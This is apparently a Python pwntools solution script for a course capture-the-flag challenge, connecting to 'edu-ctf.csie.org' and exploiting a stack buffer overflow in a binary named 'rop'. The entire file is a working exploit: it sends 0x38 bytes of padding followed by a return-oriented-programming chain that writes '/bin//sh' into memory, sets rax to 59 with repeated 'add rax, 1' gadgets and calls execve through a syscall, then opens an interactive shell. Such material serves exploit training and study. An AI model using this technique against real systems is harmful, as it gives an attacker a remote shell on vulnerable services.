from pwn import *
from struct import pack

pr = remote('edu-ctf.csie.org', 10173)
# pr = process('./rop-2de8166134d2df0695697b043511d4d0')

p = ''
p += pack('<Q', 0x00000000004100f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415714) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000047f4f1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004100f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c70) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f4f1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004100f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449935) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c70) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474940) # add rax, 1 ; ret
p += pack('<Q', 0x000000000047b68f) # syscall

payload = 'a' * 0x30 + 'b' * 0x8 + p
pr.sendline(payload)

pr.interactive()
